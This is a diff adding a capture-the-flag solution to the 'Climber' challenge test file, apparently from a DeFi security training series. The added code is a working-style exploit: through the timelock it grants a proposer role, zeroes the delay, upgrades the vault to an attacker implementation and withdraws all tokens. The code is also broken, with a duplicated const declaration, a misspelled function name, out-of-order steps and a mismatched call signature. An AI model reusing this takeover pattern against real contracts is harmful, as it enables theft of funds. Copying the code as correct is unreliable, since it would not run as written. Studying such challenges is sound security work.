@@ -53,6 +53,55 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const attackVault = this.vault.connect(attacker);
+        const attackTimelock = this.timelock.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));
+
+        const AttackTimelockFactory = await ethers.getContractFactory("AttackTimelock", attacker);
+        const attackTimelock = await AttackTimelockFactory.deploy(
+            attackVault.address,
+            attackTimelock.address,
+            attackToken.address,
+            attacker.address);
+
+        const BadImplementationFactory = await ethers.getContractFactory("AttackVault", attacker);
+        const badImplementation = await BadImplementationFactory.deploy();
+
+        const buildTx = (signature, methodName, args) => {
+            const ABI = signature;
+            const IFace = new ethers.utils.Interface(ABI);
+            const ABIData = IFace.encodeFunctionData(methodName, args);
+            return ABIData;
+        }
+
+        // See ../Notes/12-Climber.md
+        // Step1:
+        const grantRoleSig = ["function grantRole(bytes32 role, address account)"];
+        const grantRoleData = buildTx(grantRoleSig, "grantRole", [PROPOSER_ROLE, attackTimelock.address]);
+
+        // Step3:
+        const updateDelaySig = ["function updateDalay(uint64 newDelay)"];
+        const updateDalayData = buildTx(updateDelaySig, "updateDalay", [0]);
+
+        // Step2:
+        const upgradeSig = ["function upgradeTo(address newImplementation)"];
+        const upgradeData = buildTx(upgradeSig, "upgradeTo", [badImplementation.address]);
+
+        //
+        const hackSig = ["function hack()"];
+        const hackData = buildTx(hackSig, "hack", undefined);
+
+        const toAddress = [attackTimelock.address, attackTimelock.address, attackVault.address, attackTimelock.address];
+        const data = [grantRoleData, updateDalayData, upgradeData, hackData];
+        
+        await attackTimelock.setScheduleData(toAddress, data);
+
+        // Step 4:
+        await attackTimelock.hack(toAddress, Array(data.length).fill(0), data, ethers.utils.hexZeroPad("0x00", 32));
+
+        // Complete hack
+        await attackTimelock.withdraw();
     });
 
     after(async function () {
